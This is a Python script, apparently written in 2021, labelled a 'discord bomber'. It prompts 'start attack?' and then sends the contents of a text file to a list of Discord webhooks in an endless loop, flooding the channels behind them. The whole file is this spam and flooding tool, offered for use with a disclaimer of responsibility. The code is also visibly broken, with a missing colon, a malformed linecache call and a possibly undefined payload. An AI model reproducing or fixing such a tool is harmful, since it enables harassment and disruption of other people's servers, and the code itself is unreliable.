import requests
import gratient
import os
import linecache

os.system("title 𝙎𝙡𝙞𝙣𝙠'𝙨 𝙙𝙞𝙨𝙘𝙤𝙧𝙙 𝙗𝙤𝙢𝙗𝙚𝙧")
os.system("cls")


banner = (gratient.purple("""
**********************************************************************
*  ,_   ___,_,  _, _, ,_    ,_       __   _,  , ,  __   _,,_         *
*  | \,' | (_, /  / \,|_)   | \,    '|_) / \,|\/| '|_) /_,|_)        *
* _|_/  _|_,_)'\_'\_/'| \  _|_/     _|_)'\_/ | `| _|_)'\_'| \        *
*'     '   '     `'   '  `'        '     '   '  `'       `'  `       *
*                                                                    *
*    writen by Slinknight in 2021                                    *
*                                                                    *
**********************************************************************                       
"""))

print("")
print("i'm not responsible for any damage caused")
print("to stop the attack, close the application")
print(" ")

input("start attack? >> ")

text1line = linecache.getline('text.txt', 1) + linecache.getline('text.txt', 2)
text2line = str(linecache.getline('text.txt', 1)) + str(linecache.getline('text.txt', 2))

if len(text2line) > 2000:
    print("text is bigger than 2000 characters")
else:
    payload = {"content": text1line}


for lines in linecache.getline('webhooks.txt')
    while 1:   
        response = requests.post(lines, data=payload)

